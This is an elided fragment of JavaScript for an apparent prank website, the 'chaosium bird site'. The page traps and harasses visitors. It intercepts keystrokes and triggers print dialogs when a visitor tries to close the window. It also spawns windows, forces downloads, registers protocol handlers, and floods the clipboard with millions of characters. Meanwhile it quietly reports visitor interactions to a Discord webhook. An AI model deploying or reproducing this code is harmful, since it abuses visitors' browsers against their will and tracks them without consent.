...
const VIDEOS = [
  'images/intro.gif',
  'images/Peter_Griffin.png',
  'images/trollmad.jpg',
  'images/trollwhoooo.jpg',
  'images/catsnake.png',
  'images/duckcat.png',
  'images/baaaaaaaby.png',
  'images/ptok.jpg',
  'images/intro.gif',
  'images/Peter_Griffin.png',
  'images/trollmad.jpg', // added by @dan64iel
  'images/trollwhoooo.jpg', //added by @imzeme
  'images/catsnake.png' //added by @GameShoot8050
]
...
const FILE_DOWNLOADS = [
  ...
  'images/duckcat.png',
  'images/baaaaaaaby.png',
  'images/intro.gif', // added by @dan64iel
  'images/Peter_Griffin.png', //added by @imzeme
  'images/trollmad.jpg', //added by @imzeme
  'images/trollwhoooo.jpg' //added by @MARECKIyt
]

const PHRASES = [
  'hello my name is chaosium, lol',
  'birds are funny lalalalalalalallalala',
  'what\'s up with you because I\'m good',
  'knuuurrr explosion',
...
/**
 * Configuration object for webhook and API settings
 */
let config = null
...
/**
 * Send Discord notification about user interaction
 */
async function sendDiscordNotification(interactionType) {
  if (!config || !config.Token) return
  
  try {
    const embed = {
      title: "🦅 Bird Site Interaction",
      description: `Someone interacted with the chaosium bird site!`,
      color: 0x34eb7d,
      fields: [
        {
...
//Very long string xd, crappy implementation but it's probably better than ~ 4 million characters in the file - added by @9fm

const veryLongString = repeatStringNumTimes(repeatStringNumTimes('you have been ptoszked!!1 ',100),1500) // - added by @9fm
...
function init () {
  ...
  interceptUserInput(event => {
    ...
    // Send Discord notification on first interaction
    if (interactionCount === 1) {
      sendDiscordNotification('First interaction - Site visited!')
    }
    ...
    if (event.key === 'Meta' || event.key === 'Control') {
      sendDiscordNotification('User tried to close window!')
      window.print()
...
function registerProtocolHandlers () {
  ...
  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Bird')
  })
}
...
function openWindow () {
  ...
  // Send Discord notification about new window
  sendDiscordNotification(`New window spawned! Total windows: ${wins.length}`)
...
/**
 * Copies ~4 million characters to clipboard  - added by @9fm
 */
